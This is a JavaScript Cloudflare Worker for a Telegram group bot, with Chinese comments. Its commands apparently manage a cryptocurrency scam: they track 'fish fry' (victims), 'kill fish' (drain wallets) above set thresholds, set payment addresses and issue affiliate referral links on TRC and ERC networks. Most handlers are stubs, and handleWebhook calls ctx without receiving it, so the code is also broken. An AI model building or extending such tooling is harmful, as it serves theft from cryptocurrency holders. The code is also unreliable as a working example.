/**
 * Cloudflare Workers Webhook Handler for Telegram Bot
 * 使用 Webhook 模式接收 Telegram 更新
 */

export default {
  async fetch(request, env, ctx) {
    // 只处理 POST 请求
    if (request.method !== 'POST') {
      return new Response('Method not allowed', { status: 405 });
    }

    try {
      const url = new URL(request.url);
      
      // Webhook 路径
      if (url.pathname === '/webhook' || url.pathname === '/') {
        return handleWebhook(request, env);
      }
      
      // 健康检查
      if (url.pathname === '/health') {
        return new Response(JSON.stringify({ status: 'ok' }), {
          headers: { 'Content-Type': 'application/json' }
        });
      }

      return new Response('Not found', { status: 404 });
    } catch (error) {
      return new Response(JSON.stringify({ error: error.message }), {
        status: 500,
        headers: { 'Content-Type': 'application/json' }
      });
    }
  }
};

/**
 * 处理 Telegram Webhook
 */
async function handleWebhook(request, env) {
  try {
    const update = await request.json();
    
    // 验证 Webhook Secret（可选但推荐）
    const secretToken = request.headers.get('X-Telegram-Bot-Api-Secret-Token');
    if (env.WEBHOOK_SECRET && secretToken !== env.WEBHOOK_SECRET) {
      return new Response('Unauthorized', { status: 401 });
    }

    // 异步处理更新（不等待完成）
    ctx.waitUntil(processUpdate(update, env));

    // 立即返回 200 OK
    return new Response('OK', { status: 200 });
  } catch (error) {
    console.error('Webhook error:', error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

/**
 * 处理 Telegram 更新
 */
async function processUpdate(update, env) {
  try {
    // 消息处理
    if (update.message) {
      await handleMessage(update.message, env);
    }
    
    // 回调查询处理
    if (update.callback_query) {
      await handleCallbackQuery(update.callback_query, env);
    }
  } catch (error) {
    console.error('Process update error:', error);
  }
}

/**
 * 处理消息
 */
async function handleMessage(message, env) {
  const chatId = message.chat.id;
  const text = message.text?.trim() || '';
  const userId = message.from.id;
  
  // 只处理群组消息
  if (message.chat.type === 'private') {
    return;
  }

  // 检查是否为配置的群组
  const isConfiguredGroup = await checkGroupConfig(chatId.toString(), env);
  if (!isConfiguredGroup) {
    return;
  }

  // 检查是否为管理员
  const isAdmin = await checkAdmin(chatId, userId, env);
  
  // 处理命令
  const command = parseCommand(text);
  if (command) {
    await executeCommand(command, message, env, isAdmin);
  }
}

/**
 * 处理回调查询
 */
async function handleCallbackQuery(callbackQuery, env) {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const userId = callbackQuery.from.id;
  
  // 处理链选择
  if (data.startsWith('chain_')) {
    await handleChainSelection(callbackQuery, env);
    return;
  }
  
  // 处理鱼苗回调
  if (data.startsWith('fish_')) {
    await handleFishCallback(callbackQuery, env);
    return;
  }
  
  // 其他回调处理...
}

/**
 * 解析命令
 */
function parseCommand(text) {
  const patterns = [
    { type: 'classMode', regex: /^(上课|下课)$/ },
    { type: 'rules', regex: /^(规则|交易规则|担保交易规则|担保规则)$/ },
    { type: 'threshold', regex: /^(?:修改阈值|阈值修改|阈值|修改阀值|阀值修改|阀值)\s*([A-Za-z0-9]+)\s*([0-9.]+)$/ },
    { type: 'killFish', regex: /^(?:杀鱼|单杀)\s*([A-Za-z0-9]+)$/ },
    { type: 'paymentAddress', regex: /^(?:收款地址|设置地址|设置收款地址)\s*([A-Za-z0-9]+)$/ },
    { type: 'autoThreshold', regex: /^(?:自动阈值|设置自动阈值|全局阈值|设置阈值|设置阀值|自动阀值|设置自动阀值|全局阀值)\s*([0-9.]+)$/ },
    { type: 'getPaymentAddress', regex: /^(收款地址)$/ },
    { type: 'getFishInfo', regex: /^(我的|我的鱼苗|鱼苗|鱼池)$/ },
    { type: 'getAgentLink', regex: /^(代理|代理链接|链接|商城|发卡)$/ },
    { type: 'adminQueryFish', regex: /^(?:查看鱼苗|查看用户|查看代理|鱼苗查询|查询鱼苗)(?:\s*@|\s+@)([A-Za-z0-9_]+)$/ },
    { type: 'payment', regex: /^(?:收款|收银台|收银)\s*([0-9]+(?:\.[0-9]{1,6})?)$/ },
  ];
  
  for (const pattern of patterns) {
    const match = text.match(pattern.regex);
    if (match) {
      return { type: pattern.type, args: match.slice(1) };
    }
  }
  
  return null;
}

/**
 * 执行命令
 */
async function executeCommand(command, message, env, isAdmin) {
  const chatId = message.chat.id;
  const messageId = message.message_id;
  
  try {
    switch (command.type) {
      case 'classMode':
        await handleClassMode(chatId, message, command.args[0], env);
        break;
      case 'rules':
        await sendRules(chatId, messageId, env);
        break;
      case 'getFishInfo':
        await sendFishInfo(chatId, message, env);
        break;
      case 'getAgentLink':
        await sendAgentLink(chatId, message, env);
        break;
      // 其他命令处理...
      default:
        console.log(`Unknown command: ${command.type}`);
    }
  } catch (error) {
    console.error('Execute command error:', error);
    await sendMessage(chatId, '❌ 处理命令时出现错误，请稍后重试。', env, messageId);
  }
}

/**
 * 发送消息到 Telegram
 */
async function sendMessage(chatId, text, env, replyToMessageId = null, options = {}) {
  const botToken = env.BOT_TOKEN;
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
  const payload = {
    chat_id: chatId,
    text: text,
    parse_mode: 'HTML',
    ...options
  };
  
  if (replyToMessageId) {
    payload.reply_to_message_id = replyToMessageId;
  }
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    
    return await response.json();
  } catch (error) {
    console.error('Send message error:', error);
    throw error;
  }
}

/**
 * 检查群组配置
 */
async function checkGroupConfig(groupId, env) {
  // 从 KV 或数据库检查
  // 这里简化处理，实际应该查询数据库
  return true;
}

/**
 * 检查管理员
 */
async function checkAdmin(chatId, userId, env) {
  // 检查是否为群组管理员
  try {
    const botToken = env.BOT_TOKEN;
    const url = `https://api.telegram.org/bot${botToken}/getChatMember`;
    
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        user_id: userId
      })
    });
    
    const result = await response.json();
    const status = result.result?.status;
    
    return status === 'administrator' || status === 'creator';
  } catch (error) {
    console.error('Check admin error:', error);
    return false;
  }
}

/**
 * 处理上课/下课
 */
async function handleClassMode(chatId, message, mode, env) {
  // 实现上课/下课逻辑
  // 需要存储状态到 KV 或数据库
  const text = mode === '上课' ? '✅ 已开启上课模式' : '✅ 已开启下课模式';
  await sendMessage(chatId, text, env, message.message_id);
}

/**
 * 发送规则
 */
async function sendRules(chatId, messageId, env) {
  const rules = `📋 交易规则\n\n规则内容...`;
  await sendMessage(chatId, rules, env, messageId);
}

/**
 * 发送鱼苗信息
 */
async function sendFishInfo(chatId, message, env) {
  // 查询数据库获取鱼苗信息
  const fishInfo = await getFishInfo(message.from.id, chatId.toString(), env);
  await sendMessage(chatId, fishInfo.text, env, message.message_id, {
    reply_markup: fishInfo.keyboard
  });
}

/**
 * 发送代理链接
 */
async function sendAgentLink(chatId, message, env) {
  // 生成代理链接
  const agentLink = await generateAgentLink(message.from.id, chatId.toString(), env);
  await sendMessage(chatId, agentLink.text, env, message.message_id, {
    reply_markup: agentLink.keyboard
  });
}

/**
 * 处理链选择
 */
async function handleChainSelection(callbackQuery, env) {
  const data = callbackQuery.data;
  const match = data.match(/^chain_(\w+)_(.+)$/);
  
  if (match) {
    const chain = match[1].toUpperCase();
    const uniqueId = match[2];
    
    // 生成代理链接
    const link = await generateProxyLink(chain, uniqueId, env);
    
    // 编辑消息
    const botToken = env.BOT_TOKEN;
    const url = `https://api.telegram.org/bot${botToken}/editMessageText`;
    
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: callbackQuery.message.chat.id,
        message_id: callbackQuery.message.message_id,
        text: link,
        parse_mode: 'HTML'
      })
    });
    
    // 回答回调
    await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQuery.id
      })
    });
  }
}

/**
 * 处理鱼苗回调
 */
async function handleFishCallback(callbackQuery, env) {
  // 实现鱼苗回调处理
}

/**
 * 获取鱼苗信息
 */
async function getFishInfo(userId, groupId, env) {
  // 查询数据库
  // 这里需要连接到数据库
  return {
    text: '鱼苗信息...',
    keyboard: {
      inline_keyboard: []
    }
  };
}

/**
 * 生成代理链接
 */
async function generateAgentLink(userId, groupId, env) {
  // 生成代理链接
  const mainDomain = env.MAIN_DOMAIN || 'your-domain.com';
  const uniqueId = await getOrCreateUniqueId(userId, groupId, env);
  
  return {
    text: `代理链接信息...`,
    keyboard: {
      inline_keyboard: [
        [
          { text: '🟢 TRC网络', callback_data: `chain_trc_${uniqueId}` },
          { text: '🟢 ERC网络', callback_data: `chain_erc_${uniqueId}` }
        ]
      ]
    }
  };
}

/**
 * 生成代理链接URL
 */
async function generateProxyLink(chain, uniqueId, env) {
  const mainDomain = env.MAIN_DOMAIN || 'your-domain.com';
  return `https://${mainDomain}/?ref=${uniqueId}&chain=${chain}`;
}

/**
 * 获取或创建唯一ID
 */
async function getOrCreateUniqueId(userId, groupId, env) {
  // 查询数据库或 KV
  // 如果不存在则创建
  return 'unique-id-12345';
}



